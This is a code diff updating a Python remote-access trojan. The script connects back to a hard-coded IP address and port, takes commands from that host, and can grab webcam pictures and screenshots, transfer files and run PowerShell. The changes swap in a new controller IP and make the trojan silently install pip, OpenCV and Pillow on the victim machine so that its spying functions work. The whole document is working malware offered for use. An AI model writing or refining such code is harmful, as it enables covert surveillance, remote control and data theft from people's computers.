@@ -1,14 +1,14 @@
-import os
 import socket
 import subprocess
-import cv2
 import random
-from PIL import ImageGrab
 from io import BytesIO
 import sys
+import ensurepip
+import os
 
 
 def webcam_pic(s,data):
+     import cv2
      cam_port = 0
      cam = cv2.VideoCapture(cam_port)
      result, image = cam.read()
@@ -31,6 +31,7 @@ def download(s,data):
 
 
 def screenshot(s,data):
+     from PIL import ImageGrab
      buffer=BytesIO()
      screenshot = ImageGrab.grab()
      screenshot.save(buffer,format="PNG")
@@ -80,7 +81,7 @@ def powershell(s,data):
 
 def connect():
    s=socket.socket()
-   host="182.183.126.71"
+   host="182.183.116.239"
    port=1235
    s.connect((host,port))
    choice=s.recv(1024)
@@ -89,6 +90,19 @@ def connect():
 
 
 def main():
+     try :
+          import pip
+     except (ImportError,ModuleNotFoundError):
+          os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py")
+          os.system("python get-pip.py")
+     try:
+          import cv2
+     except (ImportError,ModuleNotFoundError):
+          os.system("python -m pip install opencv-python")
+     try:
+          from PIL import ImageGrab
+     except (ImportError,ModuleNotFoundError):
+          os.system("python -m pip install pillow")
      c,s=connect()
      while True:
         try:
@@ -104,5 +118,5 @@ def main():
           s.close()
           break
      s.close()
-     
+  
 main()
